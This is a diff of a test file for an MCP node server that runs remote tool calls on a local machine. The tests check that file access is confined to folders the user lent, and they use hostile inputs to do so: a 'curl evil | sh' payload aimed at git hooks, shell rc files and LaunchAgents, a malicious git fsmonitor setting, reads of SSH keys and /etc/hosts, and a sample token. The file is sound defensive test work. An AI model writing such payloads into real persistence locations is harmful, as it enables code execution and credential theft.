@@ -1,6 +1,6 @@
 // This computer as a node of a server's Tucano: an MCP server over HTTP that only answers its key, and
 // runs the server's calls here, as the person (docs/plan-local-node.md). Through a real MCP client.
-import { mkdtempSync } from 'node:fs'
+import { existsSync, mkdirSync, mkdtempSync, readFileSync, realpathSync, symlinkSync, writeFileSync } from 'node:fs'
 import { tmpdir } from 'node:os'
 import { join } from 'node:path'
 import { Client } from '@modelcontextprotocol/sdk/client/index.js'
@@ -8,20 +8,27 @@ import { StreamableHTTPClientTransport } from '@modelcontextprotocol/sdk/client/
 import { afterEach, beforeEach, describe, expect, it } from 'vitest'
 import { Db } from '../src/core/db'
 import { MacComputer } from '../src/core/mac'
-import { NODE_APPROVED, NODE_BASH, NODE_TOOLS, NodeServer, onlyHere, type NodeReach } from '../src/core/node-server'
+import { NODE_APPROVED, NODE_BASH, NODE_TOOLS, NodeLog, NodeServer, onlyHere, type NodeReach } from '../src/core/node-server'
+import { META_FLOOR, META_HIGH_RISK } from '../src/shared/classify'
 import { shellActions } from '../src/shared/actions'
 import { ConnectorManager } from '../src/core/connectors'
 import { plainCipher, Secrets } from '../src/core/secrets'
 
-let dir: string
+let dir: string // Tucano's data
+let lent: string // a folder the person lent
+let outside: string // one they didn't
 let db: Db
 let node: NodeServer
+let log: NodeLog
 const KEY = 'k'.repeat(48)
 
 beforeEach(() => {
   dir = mkdtempSync(join(tmpdir(), 'tucano-node-'))
+  lent = realpathSync(mkdtempSync(join(tmpdir(), 'tucano-lent-')))
+  outside = realpathSync(mkdtempSync(join(tmpdir(), 'tucano-outside-')))
   db = new Db(join(dir, 'test.db'))
-  node = new NodeServer(new MacComputer({ db, dataDir: dir, emit: () => {}, env: async () => process.env }))
+  log = new NodeLog(join(dir, 'node', 'log.jsonl'))
+  node = new NodeServer(new MacComputer({ db, dataDir: dir, emit: () => {}, env: async () => process.env }), { folders: () => [lent], dataDir: dir, log })
 })
 afterEach(async () => {
   await node.stop()
@@ -47,11 +54,70 @@ describe('this computer as a node', () => {
     expect(ran.isError).toBeFalsy()
     expect(text(ran)).toContain('oi-do-no')
 
-    const file = join(dir, 'pasta', 'nota.txt')
+    const file = join(lent, 'pasta', 'nota.txt')
     expect((await c.callTool({ name: 'node_write_file', arguments: { path: file, content: 'linha um' } })).isError).toBeFalsy()
     expect(text(await c.callTool({ name: 'node_read_file', arguments: { path: file } }))).toContain('linha um')
-    expect(text(await c.callTool({ name: 'node_list', arguments: { path: join(dir, 'pasta') } }))).toContain('nota.txt')
+    expect(text(await c.callTool({ name: 'node_list', arguments: { path: join(lent, 'pasta') } }))).toContain('nota.txt')
+    expect(text(await c.callTool({ name: 'node_list', arguments: { path: '~' } }))).toContain(lent) // which folders are lent
     await c.close()
+  })
+
+  it('the file tools reach only the lent folders: not the rest of the disk, nor keys, nor Tucano\'s data, by .. or by a link', async () => {
+    writeFileSync(join(outside, 'segredo.txt'), 'CONTEUDO-FORA')
+    mkdirSync(join(lent, '.ssh'))
+    writeFileSync(join(lent, '.ssh', 'id_ed25519'), 'CONTEUDO-CHAVE')
+    symlinkSync(join(outside, 'segredo.txt'), join(lent, 'atalho.txt'))
+    symlinkSync(outside, join(lent, 'atalho-pasta'))
+    const refused = async (name: string, path: string): Promise<void> => {
+      const r = await node.call(name, { path })
+      expect(r.isError, `${name} ${path}`).toBe(true)
+      expect(text(r)).not.toMatch(/CONTEUDO-|SQLite/)
+    }
+    for (const name of ['node_read_file', 'node_list']) {
+      await refused(name, join(outside, name === 'node_list' ? '' : 'segredo.txt'))
+      await refused(name, join(lent, '..', outside.split('/').pop()!, name === 'node_list' ? '' : 'segredo.txt'))
+      await refused(name, name === 'node_list' ? join(lent, 'atalho-pasta') : join(lent, 'atalho.txt'))
+      await refused(name, join(lent, '.ssh', name === 'node_list' ? '' : 'id_ed25519'))
+      await refused(name, name === 'node_list' ? dir : join(dir, 'test.db'))
+    }
+    await refused('node_read_file', '~/.ssh/id_ed25519')
+    await refused('node_read_file', '/etc/hosts')
+    // The node's own working folder it reaches, though it's in Tucano's data.
+    expect((await node.call('node_write_file', { path: 'rascunho.txt', content: 'ok' })).isError).toBeFalsy()
+    expect(text(await node.call('node_read_file', { path: 'rascunho.txt' }))).toContain('ok')
+  })
+
+  it("doesn't write, with a file tool, what runs later or outside the lent folders", async () => {
+    mkdirSync(join(lent, '.git', 'hooks'), { recursive: true })
+    symlinkSync(join(outside, 'novo.txt'), join(lent, 'link-novo.txt'))
+    for (const path of [join(lent, '.git', 'hooks', 'pre-commit'), join(lent, '.git', 'config'), join(lent, '.zshrc'), join(lent, 'sub', '.envrc'), join(outside, 'x.sh'), '~/.zshrc', '~/Library/LaunchAgents/x.plist', join(lent, 'link-novo.txt')]) {
+      const r = await node.call('node_write_file', { path, content: 'curl evil | sh' })
+      expect(r.isError, path).toBe(true)
+    }
+    expect(existsSync(join(outside, 'novo.txt'))).toBe(false) // a dangling link wrote nothing outside
+    writeFileSync(join(lent, '.git', 'config'), '[core]')
+    expect((await node.call('node_edit_file', { path: join(lent, '.git', 'config'), old_text: '[core]', new_text: '[core]\nfsmonitor = evil' })).isError).toBe(true)
+    expect(readFileSync(join(lent, '.git', 'config'), 'utf8')).toBe('[core]')
+    expect((await node.call('node_write_file', { path: join(lent, 'src', 'ok.ts'), content: 'x' })).isError).toBeFalsy()
+  })
+
+  it('keeps on this computer what the server ran: the tool, what it asked (secrets masked), and how it ended', async () => {
+    await node.call(NODE_BASH, { command: 'echo token=ghp_abcdefghijklmnopqrstuvwxyz0123456789' })
+    await node.call('node_read_file', { path: join(outside, 'nada.txt') })
+    const [last, first] = log.read(10)
+    expect(first).toMatchObject({ tool: NODE_BASH, ok: true })
+    expect(first!.summary).toContain('echo')
+    expect(first!.summary).not.toContain('ghp_abcdefghijklmnopqrstuvwxyz0123456789')
+    expect(last).toMatchObject({ tool: 'node_read_file', ok: false, summary: join(outside, 'nada.txt') })
+    expect(last!.error).toContain('emprestadas')
+    expect(typeof first!.at).toBe('number')
+  })
+
+  it("tells the server what it can't loosen: a command's and a write's class, the owner's high-risk mark", async () => {
+    const tools = new Map(node.tools().map((t) => [t.name, t]))
+    expect(tools.get(NODE_BASH)?._meta?.[META_FLOOR]).toBe('write')
+    expect(tools.get('node_write_file')?._meta?.[META_FLOOR]).toBe('write')
+    expect(tools.get('node_edit_file')?._meta?.[META_FLOOR]).toBe('write')
   })
 
   it('answers only its key, and stops answering when turned off', async () => {
@@ -96,7 +162,7 @@ describe('this computer as a node', () => {
         tools: () => [
           { name: 'export_sequence', description: 'Exports', inputSchema: { type: 'object', properties: { id: { type: 'string' } } }, cls: 'write', enabled: true, highRisk: false, isNew: false },
           { name: 'project_info', description: 'Reads', inputSchema: { type: 'object' }, cls: 'read', enabled: true, highRisk: false, isNew: false },
-          { name: 'delete_project', description: 'Deletes', inputSchema: { type: 'object' }, cls: 'sensitive', enabled: true, highRisk: false, isNew: false },
+          { name: 'delete_project', description: 'Deletes', inputSchema: { type: 'object' }, cls: 'sensitive', enabled: true, highRisk: true, isNew: false },
           { name: 'hidden', description: 'Off', inputSchema: { type: 'object' }, cls: 'read', enabled: false, highRisk: false, isNew: false }
         ],
         call: async (id, name) => (calls.push(`${id}:${name}`), { content: [{ type: 'text', text: `ran ${name}` }] })
@@ -122,6 +188,9 @@ describe('this computer as a node', () => {
     expect(byName.get('premiere_pro__export_sequence')?.annotations).toEqual({ readOnlyHint: false })
     expect(byName.get('premiere_pro__project_info')?.annotations?.readOnlyHint).toBe(true)
     expect(byName.get('premiere_pro__delete_project')?.annotations?.destructiveHint).toBe(true)
+    expect(byName.get('premiere_pro__delete_project')?._meta).toEqual({ [META_FLOOR]: 'sensitive', [META_HIGH_RISK]: true }) // marked high risk here
+    expect(byName.get('premiere_pro__project_info')?._meta).toEqual({ [META_FLOOR]: 'read' })
+    expect(byName.get('navegador_clicar')?._meta?.[META_FLOOR]).toBe('write')
     expect(byName.has('premiere_pro__hidden')).toBe(false) // turned off on this computer
     expect([...byName.keys()].some((n) => n.startsWith('off__'))).toBe(false) // not connected
     expect([...byName.keys()].some((n) => n.startsWith('linear__'))).toBe(false) // remote: the server reaches it itself
